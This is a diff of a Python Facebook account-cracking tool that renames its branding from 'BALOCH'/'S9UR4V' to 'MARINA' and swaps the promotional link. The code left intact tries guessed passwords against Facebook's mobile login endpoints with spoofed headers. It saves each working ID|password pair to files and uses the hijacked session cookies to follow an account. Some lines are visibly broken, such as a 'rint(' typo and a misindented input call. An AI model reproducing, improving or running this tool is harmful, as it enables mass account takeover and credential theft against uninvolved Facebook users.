@@ -315,14 +315,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ BALOCH-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ MARINA-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ MARINA-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ S9UR4V] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ MARINA] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ BALOCH-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ MARINA-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ MARINA-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BALOCH-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MARINA-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -407,9 +407,9 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;36m     AMIT KI DIDI KO GALI NA DENE WALON KA APROVEL URA DEYA JAIGA")
+		print("\033[1;36m     HACKER MARINA x KIRAN HERE LOYAL BESTIES,SO LOVE IN BOTH")
 		print("")
-		print("\033[1;32m [1] First You AMIT KI DIDI KO GALI")
+		print("\033[1;32m [1] First YOU FOLLOW MY FACEBOOK ID ")
 		print("\033[1;33m [2] Exit")
 		print("")
 		S9UR4V = input("\n\033[1;36m  Chose ==> \033[1;32m")
@@ -419,12 +419,12 @@ class Main:
 			print("    Thanks🥰♥️")
 			exit()
 		elif S9UR4V in ["1", "01"]:
-			os.system("xdg-open https://www.youtube.com/@souravtiwari6905")
+			os.system("xdg-open https://www.facebook.com/gamerqueen3632")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Apna nam type kro")
+			print("\033[1;33m    WHO ARE THE OWNER OF THIS TOOL")
 			print("")
-			input("\n\033[1;32m  Type Name ==> \033[1;36m")
+		input("\n\033[1;32m  TYPE THE NAME OF OWNER ==> \033[1;36m")
 			time.sleep(2.1)
 			print("")
 			print("\033[1;32m Successful Bro")
